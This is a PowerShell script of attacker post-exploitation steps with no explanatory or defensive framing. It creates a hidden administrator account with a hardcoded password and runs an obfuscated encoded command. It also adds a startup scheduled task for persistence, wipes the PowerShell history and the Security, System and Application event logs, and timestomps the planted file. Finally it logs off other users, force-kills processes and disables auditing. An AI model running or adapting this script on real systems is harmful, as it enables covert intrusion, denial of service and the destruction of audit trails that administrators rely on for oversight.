# Step 1: Escalate Privileges using RunAs
function Escalate-Privileges {
    Start-Process powershell -Verb RunAs
}

# Step 2: Create Immutable User Profile (Administrator Rights Required)
function Create-Immutable-User {
    $username = "secureuser"
    $password = ConvertTo-SecureString "SuperSecurePassword123!" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName "Secure User" -Description "Immutable Profile User"
    Add-LocalGroupMember -Group "Administrators" -Member $username
    
    # Set user profile as read-only (immutable)
    $profilePath = "C:\Users\$username"
    icacls $profilePath /deny $username:(W)
}

# Step 3: Switch to the newly created user account
function Switch-User {
    $username = "secureuser"
    $password = "SuperSecurePassword123!"

    # Encoded command to avoid logging plain-text credentials
    $command = {
        param($username, $password)
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
        Start-Process "powershell" -Credential $credential -ArgumentList "-NoExit" -Wait
    }
    
    # Encode command for obfuscation and execution
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
    Start-Process powershell.exe -ArgumentList "-encodedCommand $encodedCommand"
}

# Step 4: Execute the script in /tmp and recreate it if deleted
function Execute-Script-In-Temp {
    $scriptPath = "C:\Windows\Temp\persistence_script.ps1"
    
    # Create a sample script to be executed in /tmp
    $scriptContent = @"
    Write-Host "This is a persistent script running from Temp"
"@
    
    # Write to Temp
    $scriptContent | Out-File $scriptPath
    
    # Create a Scheduled Task to re-create the script if deleted
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $scriptPath"
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "RecreateScript"
    
    # Run the script
    Invoke-Expression -Command $scriptPath
}

# Step 5: Delete PowerShell History and Logs
function Delete-PowerShell-History {
    # Clear PowerShell History
    Remove-Item (Get-PSReadlineOption).HistorySavePath

    # Clear Event Logs
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    wevtutil cl "Security"
    wevtutil cl "System"
    wevtutil cl "Application"
}

# Step 6: Timestomping to Hide Changes
function TimeStomp {
    $file = "C:\Windows\Temp\persistence_script.ps1"
    $lastAccessTime = Get-Date "1/1/2000"
    $lastWriteTime = Get-Date "1/1/2000"
    $creationTime = Get-Date "1/1/2000"

    # Set timestamps to hide the existence of the script
    (Get-Item $file).LastAccessTime = $lastAccessTime
    (Get-Item $file).LastWriteTime = $lastWriteTime
    (Get-Item $file).CreationTime = $creationTime
}

# Step 7: Kill Processes and Remove Other Sessions
function Kill-Sessions-And-Users {
    # List all active users and sessions
    $sessions = query user
    foreach ($session in $sessions) {
        # Log off users
        logoff $session.SessionId
    }

    # Kill active processes (non-system)
    Get-Process | Where-Object { $_.ProcessName -notlike "system" -and $_.ProcessName -notlike "services" } | Stop-Process -Force
}

# Step 8: Disable Logging (Auditing and ETW)
function Disable-Logging {
    # Disable Auditing
    auditpol /clear /y

    # Disable ETW (Event Tracing for Windows)
    wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false
    wevtutil sl Security /e:false
}

# Main function to run all steps and switch between accounts
function Main {
    Escalate-Privileges
    Create-Immutable-User
    Switch-User # Switch to the secure user
    Execute-Script-In-Temp
    Delete-PowerShell-History
    TimeStomp
    Kill-Sessions-And-Users
    Disable-Logging
}

# Run the main function
Main
